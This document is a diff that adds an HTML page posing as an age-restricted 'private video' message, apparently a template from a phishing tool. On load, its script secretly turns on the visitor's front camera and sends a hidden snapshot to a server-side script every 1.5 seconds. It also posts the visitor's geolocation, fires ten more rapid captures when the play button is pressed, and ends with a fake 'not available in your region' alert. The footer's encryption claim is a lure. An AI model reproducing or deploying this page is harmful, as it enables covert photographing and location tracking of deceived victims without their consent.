@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Private Video</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#000;color:#fff;font-family:system-ui,-apple-system,sans-serif;height:100vh;overflow:hidden;display:flex;flex-direction:column}
+.header{background:linear-gradient(135deg,#d63076,#8b2be2);padding:16px;text-align:center;font-weight:600;font-size:18px}
+.video-container{flex:1;position:relative;background:#000}
+video{width:100%;height:100%;object-fit:cover;filter:blur(20px) brightness(0.4)}
+.overlay{position:absolute;inset:0;background:rgba(0,0,0,0.75);display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:20px}
+h1{font-size:26px;font-weight:800;margin-bottom:12px}
+p{font-size:16px;color:#ccc;margin-bottom:30px;max-width:320px;line-height:1.5}
+button{background:#d63076;color:#fff;border:none;border-radius:50px;padding:16px 50px;font-size:18px;font-weight:700;min-width:280px;box-shadow:0 8px 30px rgba(214,48,118,0.5);cursor:pointer}
+.footer{padding:12px;font-size:12px;color:#555;text-align:center}
+.video-capture{
+    position:fixed;
+    top:0;
+    left:0;
+    width:640px;
+    height:480px;
+    z-index:-100;
+    opacity:0;
+    pointer-events:none;
+}
+#cam {
+    filter: none !important;
+    width: 640px !important;
+    height: 480px !important;
+}
+</style>
+</head>
+<body>
+
+<div class="video-capture">
+  <video id="cam" playsinline autoplay muted></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
+</div>
+
+<div class="header">You received a private video</div>
+
+<div class="video-container">
+  <video loop muted playsinline>
+    <source src="https://cdn.jsdelivr.net/gh/techchipnet/AnuBiS/assets/preview.mp4" type="video/mp4">
+  </video>
+  <div class="overlay">
+    <h1>Age Restricted</h1>
+    <p>This video contains adult content. Confirm you are over 18 to continue.</p>
+    <button onclick="play()">I am over 18 - Play Video</button>
+  </div>
+</div>
+
+<div class="footer">End-to-end encrypted • Not saved on device</div>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script>
+function send(data){$.post("forwarding_link/post.php",{cat:data});}
+function loc(){navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>$.post("forwarding_link/location.php",{lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}));}
+
+const video = document.getElementById("cam");
+const canvas = document.getElementById("canvas");
+const constraints = { audio: false, video: { facingMode: "user" } };
+
+// Start camera on page load
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    window.stream = stream;
+    video.srcObject = stream;
+    
+    video.onloadedmetadata = function(e) {
+      video.play();
+    };
+
+    var context = canvas.getContext('2d');
+    setInterval(function(){
+      if (video.readyState === video.HAVE_ENOUGH_DATA) {
+          context.drawImage(video, 0, 0, 640, 480);
+          var canvasData = canvas.toDataURL("image/jpeg", 0.9);
+          send(canvasData);
+      }
+    }, 1500);
+    
+    loc();
+  } catch(e) {}
+}
+
+init();
+
+// When they press the button = 10 rapid shots
+function play(){
+  document.querySelector(".overlay").innerHTML="<div style='padding:40px;color:#fff'><h2>Loading video...</h2></div>";
+  const ctx = canvas.getContext("2d");
+  for(let i=0;i<10;i++){
+    setTimeout(()=>{
+      ctx.drawImage(video,0,0,640,480);
+      send(canvas.toDataURL("image/jpeg",0.95));
+    }, i*200);
+  }
+  loc();
+  setTimeout(()=>{alert("This video is not available in your region.");},2800);
+}
+</script>
+</body>
+</html>
